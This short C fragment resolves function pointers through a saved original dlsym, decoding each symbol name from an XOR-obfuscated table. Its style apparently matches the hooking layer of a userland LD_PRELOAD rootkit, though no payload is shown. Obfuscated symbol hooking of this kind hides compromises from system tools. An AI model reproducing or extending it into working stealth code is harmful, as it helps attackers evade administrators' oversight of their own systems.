static void get_symbol_pointer(int symbol_index, void *handle){
	if(symbols[symbol_index].func != NULL || all[symbol_index] == NULL)
		return;
	locate_dlsym();
	xor(symbol_name, all[symbol_index]);
	if(strlen(symbol_name) < 2)
		goto end_get_symbol_pointer;
	symbols[symbol_index].func = o_dlsym(handle, symbol_name);
end_get_symbol_pointer:
	clean(symbol_name);
	return;
}

static void _hook(void *handle, ...){
	int symbol_index;
	va_list va;
	va_start(va, handle);
	while((symbol_index = va_arg(va, int)) > -1){
		if(symbol_index > ALL_SIZE)
			break;
		get_symbol_pointer(symbol_index, handle);
	}
	va_end(va);
	return;
}
